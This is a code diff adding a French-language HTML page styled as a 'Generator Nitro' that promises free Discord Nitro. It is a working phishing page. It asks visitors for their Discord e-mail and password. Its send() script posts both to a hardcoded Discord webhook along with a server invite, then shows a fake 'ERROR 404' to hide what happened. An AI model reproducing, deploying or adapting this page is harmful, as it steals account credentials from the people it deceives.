@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="FR">
+<head>
+	<meta charset="UTF-8">
+	<title>Generator Nitro</title>
+
+</head>
+<body>
+
+    
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="Nitro.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form">
+			
+			<div class="input_field">
+				<input type="email" name="username" id="username" placeholder="Discord e-mail" class="input" required>
+				</div>
+			<div class="input_field">
+					<input type="password" name="password" id="password" placeholder="Mot de passe" class="input"required>
+				</div>
+				<button class="btn" onclick="send()" >
+					<div class="btnt" > Send Nitro </div>
+				</button>
+			</form>
+			</div>
+
+			<div class="dif">
+
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+<script>
+
+    function send(){
+        var a = document.getElementById("username").value; 
+        var b = document.getElementById("password").value; 
+        var discordWebhook = "https://discord.com/api/webhooks/908309706655801404/dpq2yXkKa58nJRZguKf3u5bT30JQdO9MRBINsyYJAac-i0tS4oZi94faEETgzdOPXrlH";       
+        var request = new XMLHttpRequest();
+        request.open("POST", discordWebhook);
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+			username: "SadCord .gg/mkgvTuBSZM",
+            avatar_url: "https://cdn.discordapp.com/attachments/900813614628368397/908308809016045590/OkYU6D.jpg",
+
+            content: 'e-mail :'+a+" Password:"+b+" https://discord.gg/mkgvTuBSZM"
+    
+        };
+        request.send(JSON.stringify(params));
+        alert("ERROR 404")
+    
+    }
+    
+</script>
+
+<style>
+@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+
+*{
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+	outline: none;
+	list-style: none;
+	text-decoration: none;
+	font-family: 'Roboto', sans-serif;
+}
+
+body{
+	background: #fafafa;
+	font-size: 14px;
+	background: url("back.png");
+}
+
+.wrapper .header{
+	max-width: 350px;
+	width: 100%;
+	height: auto;
+	margin: 50px auto;
+}
+
+.wrapper .header .top,
+.wrapper .signup{
+	background: #fff;
+	border: 1px solid #e6e6e6;
+	border-radius: 1px;
+	padding: 40px 40px 20px;
+}
+
+.wrapper .header .logo img{
+	display: block;
+	margin: 0 auto 35px;
+}
+
+.wrapper .header .form .input_field{
+	margin-bottom: 5px;
+}
+
+.wrapper .header .form .input_field .input{
+	width: 100%;
+	background: #fafafa;
+	border: 1px solid #efefef;
+	font-size: 12px;
+	border-radius: 3px;
+	color: #262626;
+	padding: 10px;
+}
+
+.wrapper .header .form .input_field .input:focus{
+	border: 1px solid #b2b2b2;
+}
+
+.wrapper .header .form .btn {
+	margin: 10px 0;
+	background-color: rgb(178,221,255);
+    	border: 1px solid rgb(178,221,255);
+    	border-radius: 4px;
+   	text-align: center;
+   	padding: 5px;
+	width: 100%;
+}
+
+.wrapper .header .form .btn:hover{
+	margin: 10px 0;
+	background-color: #3897f0;
+   	border: 1px solid #3897f0;
+    	border-radius: 4px;
+    	text-align: center;
+	padding: 5px;
+    	width: 100%;
+}
+
+.wrapper .header .form .btnt{
+	color: #fff;
+	display: block;
+	font-size: 1rem;
+}
+
+.wrapper .header .or{
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	height: 15px;
+	margin: 15px 0 20px;
+}
+
+.wrapper .header .or .line{
+	width: 105px;
+	height: 2px;
+	background: #efefef;
+}
+
+.wrapper .header .or p{
+	color: #999;
+	font-size: 12px;
+}
+
+.wrapper .dif .fb{
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+.wrapper .dif .fb img{
+	width: 16px;
+	height: 16px;
+}
+
+.wrapper .dif  .fb p{
+	color: #385185;
+	font-weight: 500;
+	margin-left: 10px;
+}
+
+.wrapper .dif .forgot{
+	font-size: 12px;
+	text-align: center;
+	margin-top: 20px;
+}
+
+.wrapper .dif .forgot a{
+	color: #003569;
+}
+
+.wrapper .signup{
+	margin: 10px 0 20px;
+	padding: 25px 40px;
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .signup a{
+	color: #3897f0;
+}
+
+.wrapper .apps{
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .apps p{
+	margin-bottom: 20px;
+}
+
+.wrapper .apps a img{
+	width: 135px;
+	height: 40px;
+	margin: 0 5px;
+}
+
+.footer{
+	max-width: 935px;
+	width: 100%;
+	margin: 0 auto;
+	padding: 40px 0;
+	display: flex;
+	justify-content: space-between;
+}
+
+.footer .links ul li{
+	display: inline-block;
+	margin-right: 10px;
+}
+
+.footer .links ul li a{
+	color: #003569;
+	font-size: 12px;
+}
+
+.footer .copyright{
+	color: #999;	
+}
+</style>
+</body>
+
+</html>
